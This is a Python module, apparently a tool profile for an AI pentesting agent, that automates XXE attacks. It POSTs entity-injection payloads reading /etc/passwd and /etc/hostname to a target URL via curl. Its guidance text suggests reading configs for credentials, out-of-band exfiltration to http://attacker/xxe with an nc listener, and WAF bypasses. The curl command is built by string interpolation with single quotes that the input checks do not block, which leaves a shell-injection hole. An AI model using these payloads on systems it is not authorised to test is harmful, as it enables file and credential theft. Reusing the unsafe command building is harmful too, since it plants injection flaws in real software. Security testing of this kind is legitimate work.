"""XXE 检测：向 XML 提交接口 POST 实体注入 payload，验证任意文件读取。

白帽定位：XML 接口（API/SOAP/文件上传）解析器未禁用外部实体 →
file:///etc/passwd 可读（任意文件读取）、Blind XXE 可外带数据。
"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed

_URL_RE = re.compile(r"^https?://[^\s;|`$\\<>{}]{1,500}$", re.IGNORECASE)
_PAYLOAD_RE = re.compile(r"^[\x20-\x7e]{1,2000}$")  # 仅可打印 ASCII（XML 载荷）

_DEFAULT_PAYLOADS: list[str] = [
    # 经典实体引用：&x; 处回显文件内容
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    # 参数实体（Blind XXE 探测：错误消息可能泄露文件首行）
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "file:///etc/passwd">%x;]><r>t</r>',
    # 文件包含变体（/etc/hostname 短文件）
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
]
_PASSWD_RE = re.compile(r"^(root|daemon|nobody|bin|sys):", re.MULTILINE)
_HOSTNAME_RE = re.compile(r"^[a-z0-9][a-z0-9.-]{0,62}$", re.MULTILINE)
_MAX_PAYLOADS = 10

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "xxe_check",
            "description": (
                "XXE 验证：向 XML 提交接口 POST 实体注入 payload（file:///etc/passwd、"
                "参数实体 Blind 探测），响应含 root: 行首或 hostname 特征即命中。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "XML 提交接口 URL，如 http://t.com/api/parse",
                    },
                    "payloads": {
                        "type": "array",
                        "description": "自定义 XML payload 列表（可选，追加到内置 3 种）",
                        "items": {"type": "string"},
                    },
                },
                "required": ["url"],
            },
        },
    },
]


def _build_cmd(url: str, payload: str) -> str:
    return (
        f"curl -s -m 15 -X POST '{url}' "
        f"-H 'Content-Type: application/xml' "
        f"--data-binary '{payload}'"
    )


def _is_xxe_hit(raw: str) -> bool:
    """命中：passwd 行首特征或 hostname 格式行（/etc/hostname 回显）。"""
    return bool(_PASSWD_RE.search(raw)) or bool(_HOSTNAME_RE.search(raw))


def _summarize(results: list[tuple[str, str]]) -> str:
    hits = [(p, raw) for p, raw in results if _is_xxe_hit(raw)]
    head: list[str] = []
    if hits:
        head.append(f"🚨 XXE 命中 ({len(hits)}/{len(results)}):")
        for p, raw in hits:
            snippet = next(
                (l for l in raw.splitlines()
                 if _PASSWD_RE.match(l) or _HOSTNAME_RE.match(l)), raw[:80])
            head.append(f"  payload: {p[:70]}…")
            head.append(f"    回显: {snippet[:80]}…")
        head.append("下一步：确认可读文件范围（读 config/db 凭据）→ 尝试 Blind XXE 外带"
                    "（http://attacker/xxe 看请求）；修复：禁用外部实体（libxml_disable_entity_loader）。")
    else:
        head.append("✅ 未命中回显——可能已禁用外部实体，或为 Blind XXE（无回显）。")
        head.append("提示：Blind 验证用外带（ENTITY SYSTEM http://你的服务器/xxe 观察请求）；"
                    "试绕过（utf-16 编码/参数实体嵌套/DOCTYPE 大小写变体）。")
    return ToolProfile._summary("", head, tail=25)


class XxeCheckProfile(ToolProfile):
    name = "xxe_check"
    aliases = ["xxe 检测", "xml 实体注入", "xxe", "外部实体", "xml 注入", "实体注入"]
    summary = "XXE 检测（XML 实体注入）"
    lore = """### XXE 检测使用要点
- 定位：XML 接口（API/SOAP/文件上传解析）→ 外部实体未禁用 → 任意文件读取。
- 3 种内置 payload：经典实体引用（&x; 回显）、参数实体（Blind 探测）、
  /etc/hostname 短文件变体。
- 判定：root:/daemon: 行首（passwd）或 hostname 格式行 = 命中。
- Blind XXE（无回显）：外带验证——ENTITY SYSTEM http://你的服务器/xxe，
  观察服务器收到请求（本地 nc -lvnp 监听）；也可用错误消息外带
  （参数实体 + 不存在文件触发错误回显）。
- 结合流程：xxe_check 命中 → 读配置找凭据/内网地址 → 扩展攻击面；
  修复：解析器禁用外部实体 + 白名单 DTD（PHP libxml_disable_entity_loader /
  Java DocumentBuilderFactory 特性关闭）。
- 注意：payload 里的 & 会被 shell 解释——本工具用 --data-binary 单引号包裹；
  某些 WAF 拦 DOCTYPE，试大小写/空白变体。"""
    extra_schemas = SCHEMAS

    async def exec_xxe_check(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("curl"):
            return "curl 未安装（apt install curl）。"
        url = str(args.get("url") or "").strip()
        if not _URL_RE.match(url):
            return f"url 格式非法: {url!r}"
        payloads = list(_DEFAULT_PAYLOADS)
        extra = args.get("payloads") or []
        if not isinstance(extra, list):
            raise ValueError("payloads 必须是列表")
        for p in extra:
            p = str(p).strip()
            if not _PAYLOAD_RE.match(p):
                raise ValueError("payload 含非法字符（仅允许可打印 ASCII）")
            if p not in payloads:
                payloads.append(p)
        if len(payloads) > _MAX_PAYLOADS:
            raise ValueError(f"payload 总数不能超过 {_MAX_PAYLOADS}")
        results: list[tuple[str, str]] = []
        for p in payloads:
            raw = await self._run(ex, _build_cmd(url, p), timeout=20)
            results.append((p, raw))
        return _summarize(results)
